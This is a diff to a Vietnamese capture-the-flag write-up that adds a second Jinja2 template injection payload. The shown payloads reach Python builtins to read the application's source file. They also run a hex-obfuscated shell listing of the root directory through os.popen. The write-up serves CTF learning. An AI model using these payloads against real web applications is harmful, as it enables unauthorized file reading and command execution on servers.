@@ -647,6 +647,12 @@ Payload hoàn chỉnh:
 {% set chr = ().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.chr %}{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.open(chr(97).__add__(chr(112).__add__(chr(112).__add__(chr(46).__add__(chr(112).__add__(chr(121)))))))}}
 ```
 
+### New update 2023:
+
+```python
+{% set b=lipsum.__globals__ %}{{b.os.popen(b.__builtins__.bytes.fromhex(b.__builtins__.hex(0x6C73202D61202F)[2:]).decode()).read()}}
+```
+
 ## Flag:
 
 ![flag](https://raw.githubusercontent.com/phucdc/write-ups/main/FUSec%202021/img/PRP202_2.png)
